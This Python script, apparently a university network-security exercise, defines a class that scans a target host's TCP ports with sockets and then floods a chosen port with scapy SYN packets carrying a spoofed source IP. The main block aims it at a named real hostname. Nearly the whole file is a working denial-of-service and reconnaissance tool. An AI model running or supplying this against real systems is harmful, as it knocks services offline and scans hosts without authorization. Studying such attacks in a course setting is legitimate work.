import socket
from scapy.all import *

class TcpAttack():
    def __init__ ( self , spoofIP :str , targetIP :str )-> None :
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    
    def scanTarget ( self , rangeStart :int , rangeEnd :int )-> None :
        open_ports = []
        f = open("openports.txt", "w")
        for port in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, port))
                open_ports.append(port)
                f.write(str(port) + "\n")
            except:
                pass
                

    def attackTarget ( self , port :int , numSyn :int )->int :
        for i in range(numSyn):
            ip_pack = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_pack = TCP(flags="S", dport=port, sport=RandShort())
            pack = ip_pack/TCP_pack
            try:
                send(pack, verbose = False)
            except Exception as e:
                print(e)

        return 0

if __name__ == "__main__":
    spoofIP = '10.10.10.10'
    targetIP = "moonshine.ecn.purdue.edu"
    tcp = TcpAttack(spoofIP , targetIP)
    tcp.scanTarget(1000 , 4000)
    port = 1716
    numSyn = 100
    if tcp.attackTarget(port , numSyn):
        print(f"Port {port} was open , and flooded with {numSyn} SYN packets")
    else:
        print(f"Unable to flood {port}")